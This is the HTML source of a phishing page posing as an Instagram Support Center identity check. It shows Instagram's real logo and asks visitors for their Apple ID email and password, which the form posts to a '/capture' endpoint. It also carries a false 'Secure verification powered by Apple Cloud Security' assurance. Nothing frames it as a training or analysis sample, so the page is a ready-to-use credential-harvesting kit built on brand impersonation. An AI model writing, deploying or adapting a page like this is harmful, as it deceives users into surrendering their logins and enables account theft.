<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Support Center | Identity Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 1px; width: 100%; max-width: 350px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        h2 { font-size: 17px; color: #8e8e8e; margin-bottom: 20px; line-height: 1.5; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 10px; border: none; border-radius: 8px; background-color: #0095f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .footer-note { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="login-card">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a25111a445d.png" class="logo">
        <h2>To recover your account, please verify your identity using the connected Apple ID.</h2>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Apple ID (Email)" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify Identity</button>
        </form>
        <p class="footer-note">Secure verification powered by Apple Cloud Security.</p>
    </div>
</body>
</html>
